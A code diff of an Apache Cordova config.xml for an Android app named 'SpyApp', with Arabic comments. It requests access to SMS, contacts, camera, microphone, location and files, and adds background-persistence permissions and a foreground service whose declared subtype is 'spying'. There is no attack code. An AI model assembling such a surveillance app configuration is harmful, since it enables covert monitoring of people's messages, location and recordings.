@@ -1,48 +1,54 @@
-<?xml version='1.0' encoding='utf-8'?>  
-<widget id="com.spyapp.spy" version="1.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">  
-    <name>SpyApp</name>  
-    <content src="index.html" />  
-    <access origin="*" />  
-    <allow-intent href="http://*/*" />  
-    <allow-intent href="https://*/*" />  
-    <allow-intent href="tel:*" />  
-    <allow-intent href="sms:*" />  
-    <allow-intent href="mailto:*" />  
-    <allow-intent href="geo:*" />  
-    <preference name="android-targetSdkVersion" value="34" />  
-  
-    <!-- الإضافات (Plugins) -->  
-    <plugin name="cordova-plugin-camera" />  
-    <plugin name="cordova-plugin-sms" />  
-    <plugin name="cordova-plugin-media-capture" />  
-    <plugin name="cordova-plugin-contacts" />  
-    <plugin name="cordova-plugin-file" />  
-    <plugin name="cordova-plugin-file-transfer" />  
-    <plugin name="cordova-plugin-geolocation" />  
-    <plugin name="cordova-plugin-android-permissions" />  
-    <plugin name="cordova-plugin-media" />  
-    <plugin name="cordova-plugin-background-mode" />  
+<?xml version='1.0' encoding='utf-8'?>
+<widget id="com.spyapp.spy" version="1.0.1" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+    <name>SpyApp</name>
+    <content src="index.html" />
+    <access origin="*" />
+    <allow-intent href="http://*/*" />
+    <allow-intent href="https://*/*" />
+    <allow-intent href="tel:*" />
+    <allow-intent href="sms:*" />
+    <allow-intent href="mailto:*" />
+    <allow-intent href="geo:*" />
+    <preference name="android-targetSdkVersion" value="34" />
 
-    <!-- إضافات مع إصدارات محددة -->  
-    <plugin name="cordova-plugin-background-mode" spec="^0.7.3" />  
-    <plugin name="cordova-plugin-sms" spec="^1.0.5" />  
-    <plugin name="cordova-plugin-media" spec="^6.1.0" />  
-    <plugin name="cordova-plugin-file" spec="^6.0.2" />  
-  
-    <platform name="android">  
-        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">  
-            <manifest xmlns:android="http://schemas.android.com/apk/res/android">  
-                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />  
-                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  
-                <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />  
-                <uses-permission android:name="android.permission.CAMERA" />  
-                <uses-permission android:name="android.permission.RECORD_AUDIO" />  
-                <uses-permission android:name="android.permission.READ_SMS" />  
-                <uses-permission android:name="android.permission.RECEIVE_SMS" />  
-                <uses-permission android:name="android.permission.SEND_SMS" />  
-                <uses-permission android:name="android.permission.INTERNET" />  
-                <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />  
-            </manifest>  
-        </edit-config>  
-    </platform>  
+    <!-- الإضافات (Plugins) -->
+    <plugin name="cordova-plugin-camera" />
+    <plugin name="cordova-plugin-sms" />
+    <plugin name="cordova-plugin-media-capture" />
+    <plugin name="cordova-plugin-contacts" />
+    <plugin name="cordova-plugin-file" />
+    <plugin name="cordova-plugin-file-transfer" />
+    <plugin name="cordova-plugin-geolocation" />
+    <plugin name="cordova-plugin-android-permissions" />
+    <plugin name="cordova-plugin-media" />
+    <plugin name="cordova-plugin-background-mode" />
+
+    <platform name="android">
+        <edit-config file="app/src/main/AndroidManifest.xml" mode="merge" target="/manifest">
+            <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+                <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+                <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+                <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+                <uses-permission android:name="android.permission.CAMERA" />
+                <uses-permission android:name="android.permission.RECORD_AUDIO" />
+                <uses-permission android:name="android.permission.READ_SMS" />
+                <uses-permission android:name="android.permission.RECEIVE_SMS" />
+                <uses-permission android:name="android.permission.SEND_SMS" />
+                <uses-permission android:name="android.permission.INTERNET" />
+                <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+                <!-- أذونات إضافية للعمل في الخلفية -->
+                <uses-permission android:name="android.permission.WAKE_LOCK" />
+                <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+            </manifest>
+        </edit-config>
+        
+        <!-- تكوين إضافي لوضع الخلفية -->
+        <config-file parent="./application" target="AndroidManifest.xml">
+            <service android:name="de.appplant.cordova.plugin.background.ForegroundService" 
+                     android:exported="false" 
+                     android:foregroundServiceType="specialUse">
+                <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value=" spying"/>
+            </service>
+        </config-file>
+    </platform>
 </widget>
